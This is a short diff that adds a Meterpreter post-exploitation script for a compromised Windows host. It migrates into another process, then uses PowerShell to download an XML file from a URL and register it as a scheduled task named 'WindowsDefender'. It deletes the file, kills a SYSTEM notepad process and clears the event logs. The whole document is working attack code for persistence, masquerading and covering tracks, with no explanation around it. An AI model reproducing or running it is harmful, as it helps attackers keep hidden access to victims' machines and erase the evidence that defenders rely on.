@@ -1,0 +1,11 @@
+run post/windows/manage/migrate
+
+load powershell
+
+powershell_execute "$drive = $pwd.Drive.Name; $path = $drive + ':\\Windows\\s.xml'; $client = New-Object System.Net.WebClient; $client.DownloadFile('$url', $path); sleep 3; schtasks /create /XML $path /tn WindowsDefender /f; sleep 2; rm $path"
+
+powershell_execute "taskkill /FI \"USERNAME eq SYSTEM\" /IM notepad.exe /F"
+
+clearev
+
+exit
